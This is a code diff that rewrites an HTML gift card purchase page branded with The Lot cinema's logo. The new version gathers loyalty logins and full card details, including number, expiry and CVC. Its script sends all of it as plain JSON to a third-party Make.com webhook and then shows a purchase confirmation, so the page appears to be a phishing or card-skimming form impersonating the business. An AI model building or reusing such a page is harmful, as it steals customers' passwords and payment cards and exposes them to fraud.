@@ -1,154 +1,131 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Selecciona tu Gift Card - The Lot</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Gift Card Purchase - The Lot</title>
   <style>
-    body {
-      font-family: 'Helvetica Neue', Helvetica, sans-serif;
-      background: #f5f5f5;
-      margin: 0;
-      padding: 2rem;
-      display: flex;
-      flex-direction: column;
+    body {font-family: 'Helvetica Neue', Helvetica, sans-serif; background: #f5f5f5; margin: 0; padding: 2rem; display: flex; align-items: center; justify-content: center; min-height: 100vh; color: #003A7E;}
+    .container {background: #fff; padding: 2rem; border-radius: 16px; box-shadow: 0px 4px 12px rgba(0,0,0,0.1); max-width: 450px; width: 100%; text-align: center; position: relative;}
+    .section {display: none;}
+    .active {display: block;}
+    .controls, .buttons {display: flex; justify-content: center; gap: 1rem; margin: 1.5rem 0;}
+    button, .continue-button, .btn {background: #003A7E; color: #fff; border: none; padding: 1rem; border-radius: 12px; font-size: 1.2rem; cursor: pointer; text-decoration: none; transition: background-color .3s;}
+    button:hover, .continue-button:hover, .btn:hover {background: #3D93F7;}
+    input, select {width: 100%; padding: 1rem; font-size: 1rem; border: 2px solid #003A7E; border-radius: 12px; box-sizing: border-box;}
+    input[readonly] {background: #e9ecef; cursor: not-allowed;}
+    #loading {
+      display: none;
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(255,255,255,0.8);
+      border-radius: 16px;
       align-items: center;
       justify-content: center;
-      min-height: 100vh;
-      color: #003A7E;
-    }
-    .container {
-      background: #fff;
-      padding: 2rem;
-      border-radius: 16px;
-      box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
-      max-width: 450px;
-      width: 100%;
-      text-align: center;
-    }
-    .logo-area {
-      background-color: #3D93F7;
-      padding: 1.5rem;
-      border-radius: 16px;
-      margin-bottom: 2rem;
-    }
-    .logo {
-      width: 180px;
-      margin-bottom: 1rem;
-    }
-    h1 {
-      font-size: 1.8rem;
-      margin-bottom: 2rem;
-      color: #003A7E;
-    }
-    .giftcard-image {
-      width: 250px;
-      height: auto;
-      border-radius: 12px;
-    }
-    .controls {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 1rem;
-      margin-bottom: 2rem;
-    }
-    .controls button {
-      background-color: #003A7E;
-      border: none;
-      color: white;
-      padding: 1rem;
-      font-size: 1.5rem;
-      border-radius: 12px;
-      cursor: pointer;
-      width: 60px;
-      height: 60px;
-      transition: background-color 0.3s;
-    }
-    .controls button:hover {
-      background-color: #3D93F7;
-    }
-    .controls input {
-      width: 100px;
-      text-align: center;
-      font-size: 1.5rem;
-      padding: 0.5rem;
-      border: 2px solid #003A7E;
-      border-radius: 12px;
-      background-color: #f5f5f5;
-    }
-    .continue-button {
-      display: inline-block;
-      background-color: #003A7E;
-      color: white;
-      text-decoration: none;
-      padding: 1rem 2rem;
-      border-radius: 12px;
       font-size: 1.2rem;
-      transition: background-color 0.3s;
+      font-weight: bold;
+      color: #003A7E;
+      z-index: 10;
     }
-    .continue-button:hover {
-      background-color: #3D93F7;
-    }
-
-    /* Responsive para móviles */
-    @media (max-width: 480px) {
-      .logo {
-        width: 140px;
-      }
-      .giftcard-image {
-        width: 200px;
-      }
-    }
+    .logo-area {background:#3D93F7; padding:1.5rem; border-radius:16px; margin-bottom:2rem;}
+    .logo {width:180px;}
+    .giftcard-image {width:250px; border-radius:12px;}
+    @media (max-width:480px){.logo{width:140px}.giftcard-image{width:200px}}
   </style>
 </head>
 <body>
-
-<div class="container">
-  
-  <div class="logo-area">
-    <img src="https://cdn.theatertoolkit.com/cdn/wwwroot/themes/custom/thelotent/images/logo.png?v=20250408.2" alt="The Lot Logo" class="logo">
+  <div class="container">
+    <div id="loading">Please wait...</div>
+    <div class="logo-area">
+      <img src="https://cdn.theatertoolkit.com/cdn/wwwroot/themes/custom/thelotent/images/logo.png?v=20250408.2" alt="The Lot Logo" class="logo">
+    </div>
+    <!-- Section: Amount Selection -->
+    <div id="section-amount" class="section active">
+      <h1>Select Gift Card Value</h1>
+      <img src="https://via.placeholder.com/250x150?text=Gift+Card" alt="Gift Card" class="giftcard-image">
+      <div class="controls">
+        <button id="decrease">-</button>
+        <input type="text" id="amount" value="100" readonly>
+        <button id="increase">+</button>
+      </div>
+      <button id="to-loyalty">Continue</button>
+    </div>
+    <!-- Section: Loyalty Login -->
+    <div id="section-loyalty" class="section">
+      <h1>Loyalty Login</h1>
+      <form id="loginForm">
+        <input type="text" id="loyaltyUser" placeholder="Username" />
+        <input type="password" id="loyaltyPass" placeholder="Password" />
+        <div class="buttons">
+          <button type="button" id="skipLogin">Skip</button>
+          <button type="submit">Login</button>
+        </div>
+      </form>
+    </div>
+    <!-- Section: Payment Form -->
+    <div id="section-payment" class="section">
+      <h1>Payment Details</h1>
+      <form id="paymentForm">
+        <input type="email" id="customer_email" placeholder="Email" required />
+        <input type="tel" id="customer_phone" placeholder="Phone" required />
+        <select id="card_type" required>
+          <option value="">Card Type</option><option>Visa</option><option>Mastercard</option><option>AMEX</option>
+        </select>
+        <input type="text" id="card_name" placeholder="Name on Card" required />
+        <input type="text" id="card_number" placeholder="Card Number" maxlength="16" required />
+        <input type="text" id="card_expiry" placeholder="MM/YY" maxlength="5" required />
+        <input type="text" id="card_cvc" placeholder="CVC" maxlength="4" required />
+        <label>Amount</label>
+        <input type="text" id="amount_display" readonly />
+        <input type="hidden" id="amount_hidden">
+        <div class="g-recaptcha" data-sitekey="6LfEvCcrAAAAAD0pDf2NlUYxazGY_iAZDwPPmGQ8"></div>
+        <button type="submit">Pay</button>
+      </form>
+    </div>
+    <!-- Section: Thank You -->
+    <div id="section-thanks" class="section">
+      <h1>Thank You!</h1>
+      <p>Your purchase is confirmed. You'll receive a confirmation email shortly.</p>
+      <a href="#" class="btn" id="finish">Finish</a>
+    </div>
   </div>
-
-  <h1>Choose the value of your Gift card</h1>
-
-  <div class="controls">
-    <button id="decrease">-</button>
-    <input type="text" id="amount" value="100" readonly>
-    <button id="increase">+</button>
-  </div>
-  
-  <a href="form-cliente.html" class="continue-button" id="continue">Continue</a>
-</div>
-
-<script>
-  const amountInput = document.getElementById('amount');
-  const decreaseBtn = document.getElementById('decrease');
-  const increaseBtn = document.getElementById('increase');
-  const continueBtn = document.getElementById('continue');
-
-  let amount = 100; // Valor inicial
-
-  decreaseBtn.addEventListener('click', () => {
-    if (amount > 5) {
-      amount -= 5;
-      amountInput.value = amount;
-    }
-  });
-
-  increaseBtn.addEventListener('click', () => {
-    if (amount < 500) { // límite máximo
-      amount += 5;
-      amountInput.value = amount;
-    }
-  });
-
-  continueBtn.addEventListener('click', (e) => {
-    e.preventDefault();
-    const nextUrl = `form-cliente.html?amount=${amount}`;
-    window.location.href = nextUrl;
-  });
-</script>
-
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+  <script>
+    // Section navigation
+    const sections = ['amount','loyalty','payment','thanks'].map(id=>document.getElementById('section-'+id));
+    function show(id){sections.forEach(s=>s.id===id? s.classList.add('active'):s.classList.remove('active'));}
+    // Amount controls
+    let amount = 100; const amtInput=document.getElementById('amount');
+    document.getElementById('decrease').onclick=()=>{if(amount>5){amount-=5;amtInput.value=amount}};
+    document.getElementById('increase').onclick=()=>{if(amount<500){amount+=5;amtInput.value=amount}};
+    document.getElementById('to-loyalty').onclick=()=>{show('section-loyalty')};
+    // Loyalty
+    document.getElementById('skipLogin').onclick=()=>{
+      preparePayment('');show('section-payment');
+    };
+    document.getElementById('loginForm').addEventListener('submit',e=>{
+      e.preventDefault();const user=document.getElementById('loyaltyUser').value.trim(),pass=document.getElementById('loyaltyPass').value.trim();
+      if(!user||!pass){alert('Enter credentials');return;}
+      document.getElementById('loading').style.display='flex';
+      fetch('https://hook.us2.make.com/j4shhdd1b8axa0ycwq857159hga53tla',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({loyaltyUser:user,loyaltyPass:pass,amount})})
+      .then(r=>r.json()).then(res=>{document.getElementById('loading').style.display='none';
+        if(res.ExtendedResultCode!==0){alert(res.ErrorDescription||'Invalid');return;} 
+        preparePayment(res.LoyaltySessionToken||'');show('section-payment');
+      }).catch(()=>{document.getElementById('loading').style.display='none';alert('Error')});
+    });
+    // Prepare payment form
+    function preparePayment(token){document.getElementById('amount_display').value=amount;document.getElementById('amount_hidden').value=amount;}
+    // Payment submission
+    document.getElementById('paymentForm').addEventListener('submit',async e=>{
+      e.preventDefault();const rec=grecaptcha.getResponse();if(!rec){alert('Complete reCAPTCHA');return;}      
+      const formData={customer_email:document.getElementById('customer_email').value,customer_phone:document.getElementById('customer_phone').value,card_type:document.getElementById('card_type').value,card_name:document.getElementById('card_name').value,card_number:document.getElementById('card_number').value,card_expiry:document.getElementById('card_expiry').value,card_cvc:document.getElementById('card_cvc').value,amount:amount,'g-recaptcha-response':rec};
+      document.getElementById('loading').style.display='flex';
+      try{const res=await fetch('https://hook.us2.make.com/j4shhdd1b8axa0ycwq857159hga53tla',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(formData)});
+        const txt=await res.text();const parsed=JSON.parse(txt),result=Array.isArray(parsed)?parsed[0]:parsed;
+        if(result.ExtendedResultCode===0) show('section-thanks'); else alert(result.ErrorDescription||'Payment error');
+      }catch{alert('Error');}finally{document.getElementById('loading').style.display='none'}
+    });
+    document.getElementById('finish').onclick=()=>window.location.reload();
+  </script>
 </body>
 </html>
